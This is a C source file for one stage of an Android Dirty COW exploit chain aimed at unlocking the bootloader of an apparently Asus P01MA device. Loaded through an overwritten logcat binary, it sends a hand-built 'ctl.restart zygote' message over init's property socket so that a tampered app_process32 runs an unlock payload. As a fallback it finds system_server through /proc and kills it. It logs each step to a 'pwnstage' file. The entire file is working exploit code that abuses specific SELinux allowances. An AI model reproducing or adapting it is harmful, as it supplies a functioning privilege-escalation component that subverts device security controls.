/* restart_zygote.c — Dirty COW logcat carrier (P01MA unlock chain).
 *
 * Where it runs: init's "bugreport" service (keychord Vol- + Vol+ + Power, keycodes
 * 114 115 116 in init.common.rc) starts /system/bin/dumpstate. It then executes
 * /system/bin/logcat, whose page-cache contents have been replaced by this
 * runner. The observed runner had uid 2000 and retained the dumpstate domain.
 *
 * Job: make init re-exec /system/bin/app_process32, which is (or will be) dirtycowed
 * with the set_unlock_flag payload. Two trigger paths, in order:
 *
 *   1. PRIMARY: property socket. Verified WW sepolicy rows for dumpstate:
 *        allow dumpstate ctl_default_prop:property_service set;
 *        allow dumpstate property_socket:sock_file write;
 *      This domain has NO system_file:execute, so exec'ing /system/bin/setprop is
 *      not available; we speak init's protocol directly:
 *        struct prop_msg { unsigned cmd; char name[32]; char value[92]; }
 *        cmd=PROP_MSG_SETPROP=1; name="ctl.restart"; value="zygote";  (rest zero)
 *      send exactly sizeof(prop_msg)=128 bytes to connect()-ed
 *      /dev/socket/property_service. init recv()s exactly 128 bytes
 *      (MSG_DONTWAIT), sees the "ctl." name, calls
 *      check_control_mac_perms(value)=pools the property-label of "ctl.zygote"
 *      (ctl_default_prop, allowed) and runs handle_control_message("restart",
 *      "zygote") -> init kills the stalled/parked zygote service and execs the
 *      (dirty) app_process32 again.
 *
 *   2. FALLBACK (only if connect/send fails): scan "/proc/N/cmdline" for
 *      "system_server" and SIGKILL it. Verified row: allow dumpstate
 *      system_server:process signal. system_server death cascades to a zygote
 *      restart on the normal framework path.
 *
 * Diagnostics: append short lines to /data/local/tmp/pwnstage.log
 * (dumpstate may create in shell_data_file; uid 2000 passes DAC; 0644 is readable
 * by adb shell). No libc. i386 int $0x80.
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_kill        37
#define SYS_nanosleep   162

/* i386 socket multiplex */
#define SYS_socketcall  102
#define SC_SOCKET       1      /* subcall 1: socket()            */
#define SC_CONNECT      3      /* subcall 3: connect()           */
#define SC_SENDTO       9      /* subcall 9: send()/sendto()     */

#define SYS_getdents64  220

/* i386 AF_UNIX = 1, SOCK_STREAM = 1 */
#define AF_UNIX_        1
#define SOCK_STREAM_    1
#define MSG_NOSIGNAL_   0x4000

#define O_RDONLY_       0
#define O_WRONLY_       1
#define O_CREAT_        0x40
#define O_APPEND_       0x400

static inline long s(int n, long a, long b, long c, long d)
{
    long r;
    __asm__ volatile ("int $0x80" : "=a"(r) : "a"(n), "b"(a), "c"(b), "d"(c)
                      : "memory", "cc");
    return r;
}

static long slen(const char *p) { long n = 0; while (p[n]) n++; return n; }

static void decU(unsigned long u, char *buf)
{
    char t[20];
    long i = 0, j = 0;
    if (u == 0) t[i++] = '0';
    while (u) { t[i++] = (char)('0' + (int)(u % 10)); u /= 10; }
    while (i) buf[j++] = t[--i];
    buf[j] = 0;
}

static void pwlog(const char *label, long v, const char *suffix)
{
    char line[120];
    long n = 0, k;
    for (k = 0; label[k] && k < 90; k++) line[n++] = label[k];
    if (v >= 0) decU((unsigned long)v, line + n); else { line[n++]='-'; decU((unsigned long)(-v), line+n); }
    while (line[n]) n++;
    for (k = 0; suffix[k] && k < 6; k++) line[n++] = suffix[k];
    long fd = s(SYS_open, (long)"/data/local/tmp/pwnstage.log",
                O_WRONLY_ | O_CREAT_ | O_APPEND_, 0644, 0);
    if (fd >= 0) { s(SYS_write, fd, (long)line, n, 0); s(SYS_close, fd, 0, 0, 0); }
}

/* ---- property socket ---- */

static const char PSOCK[] = "/dev/socket/property_service";
static char msgbuf[128];           /* sizeof(prop_msg): 4 + 32 + 92 */

static void build_msg(void)
{
    long i;
    for (i = 0; i < 128; i++) msgbuf[i] = 0;
    msgbuf[0] = 0x01;              /* PROP_MSG_SETPROP = 1, little endian */
    /* name @4: "ctl.restart" */
    { const char *n = "ctl.restart"; for (i = 0; i < slen(n); i++) msgbuf[4 + i] = n[i]; }
    /* value @36: "zygote" */
    { const char *v = "zygote"; for (i = 0; i < slen(v); i++) msgbuf[36 + i] = v[i]; }
}

static long prop_send(void)
{
    long args[6];
    long fd, rc;
    struct { short fam; char path[108]; } addr;

    long i;
    for (i = 0; i < (long)sizeof(addr); i++) ((char *)&addr)[i] = 0;
    addr.fam = AF_UNIX_;
    for (i = 0; i < slen(PSOCK); i++) addr.path[i] = PSOCK[i];
    /* addrlen = offsetof(sun_path)=2 + strlen + 1 */

    args[0] = AF_UNIX_; args[1] = SOCK_STREAM_; args[2] = 0;
    if ((fd = s(SYS_socketcall, SC_SOCKET, (long)args, 0, 0)) < 0) return -100;

    args[0] = fd;
    args[1] = (long)&addr;
    args[2] = 2 + slen(PSOCK) + 1;
    if (s(SYS_socketcall, SC_CONNECT, (long)args, 0, 0) < 0) { s(SYS_close, fd, 0,0,0); return -101; }

    args[0] = fd; args[1] = (long)msgbuf; args[2] = 128; args[3] = MSG_NOSIGNAL_;
    args[4] = 0;  args[5] = 0;
    rc = s(SYS_socketcall, SC_SENDTO, (long)args, 0, 0);

    s(SYS_close, fd, 0, 0, 0);
    return rc;   /* 128 == queued in full */
}

/* ---- fallback: SIGKILL system_server ---- */
/* dirent64 (raw offsets, no struct packing assumptions):
 *   d_ino@0 u64, d_off@8 i64, d_reclen@16 u16, d_type@18 u8, d_name@19  */

static void kill_system_server(void)
{
    long dfd = s(SYS_open, (long)"/proc", O_RDONLY_, 0, 0);
    char buf[4096];
    long n, off;
    long done = 0;
    long total = 0;

    if (dfd < 0) { pwlog("kopen=", dfd, "\n"); return; }

    /* getdents64 returns one batch at a time; keep pulling until it says done */
    for (;;) {
        n = s(SYS_getdents64, dfd, (long)buf, (long)sizeof(buf), 0);
        if (n <= 0) break;

        for (off = 0; off + 19 < n; ) {
            unsigned short reclen = (unsigned short)(
                (unsigned char)buf[off + 16] | ((unsigned short)(unsigned char)buf[off + 17] << 8));
            if (reclen < 20) break;

            { long pid = 0, i, ok = 1;
              const unsigned char *nm = (const unsigned char *)(buf + off + 19);
              for (i = 0; nm[i]; i++)
                  if (nm[i] >= '0' && nm[i] <= '9') pid = pid * 10 + (nm[i] - '0');
                  else { pid = 0; break; }

              if (pid > 1) {
                  char path[32], cl[64];
                  long j, k;
                  long cfd, rn;
                  const char *pstr = "/proc/", *csuf = "/cmdline", *t = "system_server";

                  for (j = 0; pstr[j]; j++) path[j] = pstr[j];
                  k = j;
                  decU((unsigned long)pid, path + k); while (path[k]) k++;
                  for (j = 0; csuf[j]; j++) path[k + j] = csuf[j];
                  path[k + j] = 0;

                  cfd = s(SYS_open, (long)path, O_RDONLY_, 0, 0);
                  if (cfd >= 0) {
                      total++;
                      rn = s(SYS_read, cfd, (long)cl, (long)sizeof(cl) - 1, 0);
                      if (rn > 0) {
                          cl[rn] = 0;
                          for (j = 0; t[j]; j++)
                              if (cl[j] != t[j] || j >= rn) { ok = 0; break; }
                          if (ok) {
                              long kr = s(SYS_kill, pid, 9, 0, 0);   /* SIGKILL */
                              pwlog("sskill pid=", pid, " r");
                              pwlog("skr=", kr, "\n");
                              done = 1;
                          }
                      }
                      s(SYS_close, cfd, 0, 0, 0);
                  }
              }
            }

            if (done) break;
            off += reclen;
        }
        if (done) break;
    }
    s(SYS_close, dfd, 0, 0, 0);
    if (!done) { pwlog("kscan=none", 0, "\n"); pwlog("scanned=", total, "\n"); }
}

void stage2_main(void)
{
    long rc;

    pwlog("stage2=", 1, "\n");
    build_msg();
    rc = prop_send();
    pwlog("psend=", rc, "\n");

    if (rc != 128) {
        pwlog("fallb=", rc, "\n");
        kill_system_server();
    } else {
        pwlog("ok=1\n", 0, "\n");
    }

    s(SYS_exit, 0, 0, 0, 0);
}

asm(
".globl _start\n"
"_start:\n"
"  push $0\n"
"  call stage2_main\n"
"  mov %eax, %ebx\n"
"  mov $1, %eax\n"
"  int $0x80\n"
"  hlt\n"
);
